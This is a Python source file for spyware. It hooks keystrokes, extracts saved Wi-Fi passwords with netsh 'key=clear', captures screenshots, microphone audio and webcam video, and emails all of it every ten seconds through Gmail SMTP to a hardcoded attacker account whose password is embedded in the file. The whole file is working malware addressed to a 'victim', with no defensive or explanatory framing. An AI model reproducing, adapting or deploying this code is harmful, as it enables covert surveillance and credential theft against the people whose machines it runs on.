import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
from threading import * # Timer is to make a method runs after an `interval` amount of time
from datetime import datetime
import subprocess
import re
from email.message import EmailMessage
import pyscreenshot
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import cv2


SEND_REPORT_EVERY = 10 # in seconds, 10 seconds
EMAIL_ADDRESS = "keyloggerminor2@gmail.com"
EMAIL_PASSWORD = "passward@1"



def filesender(name,subject):
    email_user = EMAIL_ADDRESS
    email_password = EMAIL_PASSWORD
    email_send = EMAIL_ADDRESS

    subject = subject

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    body = 'Hi there, sending this file of victim!'
    msg.attach(MIMEText(body,'plain'))

    filename = name
    attachment =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)


    server.sendmail(email_user,email_send,text)
    server.quit()

def save_webcam(outPath,fps,mirror=False):
    # Capturing video from webcam:
    cap = cv2.VideoCapture(0)

    currentFrame = 0
    capture_duration = 10
    # Get current width of frame
    width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)  # float
    # Get current height of frame
    height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)  # float

    # Define the codec and create VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(outPath, fourcc, fps, (int(width), int(height)))

    start_time = time.time()
    
    while ((time.time() - start_time) < capture_duration):
        
        # Capture frame-by-frame
        ret, frame = cap.read()

        if ret == True:
            if mirror == True:
                # Mirror the output video frame
                frame = cv2.flip(frame, 1)
            # Saves for video
            out.write(frame)
            
        else:
            break



        # To stop duplicate images
        currentFrame += 1

    # When everything done, release the capture
    cap.release()
    out.release()
    cv2.destroyAllWindows()




# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
# We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
wifi_list = list()
# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
if len(profile_names) != 0:
    for name in profile_names:
        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
        wifi_profile = dict()
        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # We use a regular expression to only look for the absent cases so we can ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Assign the ssid of the wifi profile to the dictionary
            wifi_profile["ssid"] = name
            # These cases aren't absent and we should run them "key=clear" command part to get the password
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Again run the regular expressions to capture the group after the : which is the password
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            # We append the wifi information to the wifi_list
            wifi_list.append(wifi_profile)
# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Create EmailMessage Object
#email = EmailMessagessid
email1 = EmailMessage()
# Who is the email from
email1["from"] = "name_of_sender"
# To which email you want to send the email
email1["to"] = EMAIL_ADDRESS
# Subject of the email
email1["subject"] = "WiFi SSIDs and Passwords"
email1.set_content(email_message)
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    # Connect securely to server
    smtp.starttls()
    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    # Send email.
    smtp.send_message(email1)

freq = 44100# Sampling frequency
duration = 10# Recording duration

def Screenshot():#Screenshots
    image = pyscreenshot.grab()# To capture the screen
    image.save("Screenshot.png")
    screenshots = ("Screenshot.png")
    print(screenshots)
    filesender(screenshots,'ScreenShot')
    
def Audio():#AudioRecording
    recording = sd.rec(int(duration * freq),samplerate=freq, channels=2)
    sd.wait()
    write("Audiorecording.wav" ,freq, recording)
    audiorecording = "Audiorecording.wav"
    print(audiorecording)
    filesender(audiorecording,'Audio Recording')

def VideoR():#VideoRecording
    save_webcam('Videooutput.avi', 30.0,mirror=True)
    videorecording='Videooutput.avi'
    print(videorecording)
    filesender(videorecording,'Video Recording')

class Keylogger:
    def __init__(self,  interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                Screenshot()
                Audio()
                VideoR()
                #Thread(target = Screenshot).start()
                #Thread(target = Audio).start()
                #Thread(target = VideoR).start()
            elif self.report_method == "file":
                self.report_to_file()
              
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()



        

    
    
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
    
    